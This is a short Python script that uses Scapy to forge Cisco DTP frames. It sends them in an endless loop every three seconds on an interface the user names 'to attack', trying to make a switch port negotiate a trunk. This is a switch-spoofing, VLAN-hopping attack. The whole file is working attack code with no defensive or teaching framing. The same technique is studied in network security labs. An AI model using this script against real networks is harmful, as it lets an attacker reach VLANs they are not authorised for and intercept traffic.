#!/usr/bin/env python3


#import Scapy & DTP
from scapy.all import * 
from scapy.contrib.dtp import *
import argparse


cisco_multicast = "01:00:0C:CC:CC:CC"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="interface", type=str, required=True, help="Choose the interface to attack")
    args = parser.parse_args()
    return args


def negotiate_trunk(interface=conf.iface, mymac=str(RandMAC())):
    dtp_frame = Dot3(src=mymac, dst=cisco_multicast)
    dtp_frame /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0x0c, code = 0x2004)
    dtp_frame /= DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=mymac)])
    print ("Trying to negotiate trunk...")
    sendp(dtp_frame, iface=args.interface, inter=3, loop=1, verbose=1) #every 3 sec, we sending the "DESIRABLE" DTP frame.

args = get_arguments()
negotiate_trunk(args.interface)
